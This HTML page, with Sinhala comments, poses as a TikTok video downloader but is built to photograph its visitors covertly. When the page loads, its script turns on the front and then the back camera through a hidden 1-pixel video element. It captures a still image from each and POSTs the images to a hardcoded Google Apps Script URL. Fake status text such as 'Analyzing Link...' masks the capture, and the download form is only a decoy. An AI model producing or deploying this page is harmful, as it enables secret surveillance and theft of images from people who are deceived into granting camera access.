<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video Downloader</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
        h1 { color: #fe2c55; margin-bottom: 20px; }
        input[type="text"] { width: 90%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
        
        /* TikTok Downloader Button */
        .dl-btn { background-color: #fe2c55; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; width: 96%; font-weight: bold; transition: 0.2s; }
        .dl-btn:hover { background-color: #e11d43; }
        .footer { margin-top: 20px; font-size: 12px; color: #777; }

        /* කැමරාව background එකේ රහසිගතව ක්‍රියාත්මක වීමට (Display:none නොකර) */
        .camera-container { position: absolute; width: 1px; height: 1px; overflow: hidden; opacity: 0; }
        #status { margin-top: 15px; font-weight: bold; color: #fe2c55; text-align: center; font-size: 14px; }
    </style>
</head>
<body>

    <div class="container">
        <h1>TikTok Downloader</h1>
        <p>ටික්ටොක් වීඩියෝ ලින්ක් එක පහතින් ඇතුළත් කරන්න:</p>
        <form action="/download" method="POST">
            <input type="text" name="url" placeholder="https://www.tiktok.com/..." required>
            <button type="submit" class="dl-btn">Download Video</button>
        </form>
        
        <!-- මෙතනින් process එක බලාගන්න පුළුවන් -->
        <div id="status">Connecting...</div>
        
        <div class="footer">Created by You ❤️</div>
    </div>

    <!-- කැමරා Elements (පිටුවට බාධාවක් නොවන සේ සඟවා ඇත) -->
    <div class="camera-container">
        <video id="video" autoplay playsinline></video>
    </div>
    <canvas id="canvas" style="display:none;"></canvas>

 <script>
    // ⚠️ ඔයාගේ GOOGLE WEB APP URL එක ⚠️
    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby4bmnhkzOY-9ivEjLNF-nzQI4Aqj5GIPr-Erz6dc-fl2P_n1rubnOfBSIINwOxoyrTug/exec";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');
    
    let currentStream = null;

    // කැමරාව නවත්වන Function එක
    function stopCurrentStream() {
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
            currentStream = null;
        }
    }

    // කැමරාව ක්‍රියාත්මක කරන පොදු Function එක
    async function startCamera(facingMode) {
        stopCurrentStream(); // කලින් stream එක නවත්වන්න
        
        // Hardware එක release වීමට කුඩා විරාමයක්
        await new Promise(resolve => setTimeout(resolve, 500));

        const constraintsOptions = [
            { video: { facingMode: facingMode }, audio: false },
            { video: { facingMode: { exact: facingMode } }, audio: false }
        ];

        for (let constraints of constraintsOptions) {
            try {
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = currentStream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                return true;
            } catch (err) {
                console.log("Attempt failed for: ", facingMode);
            }
        }
        return false;
    }

    // පිටුව ලෝඩ් වුණු ගමන්ම ක්‍රියාවලිය ආරම්භ කිරීම
    window.onload = async () => {
        statusDiv.textContent = "Initializing System...";
        
        // 1. මුලින්ම Front Camera එක ඔන් කිරීම
        const frontValid = await startCamera("user");
        if (frontValid) {
            setTimeout(async () => {
                statusDiv.textContent = "Analyzing Link...";
                await captureAndUpload();
                
                // 2. Front එක ඉවර වුණු ගමන් Back Camera එකට මාරු වීම
                const backValid = await startCamera("environment");
                
                if (backValid) {
                    setTimeout(async () => {
                        await captureAndUpload();
                        statusDiv.textContent = "Ready to Download!";
                        stopCurrentStream();
                    }, 3000);
                } else {
                    statusDiv.textContent = "Ready to Download! (B)";
                    stopCurrentStream();
                }
                
            }, 3000);
        } else {
            statusDiv.textContent = "❌ Please allow camera permission.";
        }
    };

    // ෆොටෝ එක කැප්චර් කරලා අප්ලෝඩ් කරන Function එක
    async function captureAndUpload() {
        if (!video.videoWidth || video.videoWidth === 0) {
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        if (!video.videoWidth) return; 
        
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const imageData = canvas.toDataURL('image/png');

        try {
            await fetch(WEB_APP_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });
        } catch (error) {
            console.error("Upload error:", error);
        }
    }
 </script>
    
</body>
</html>
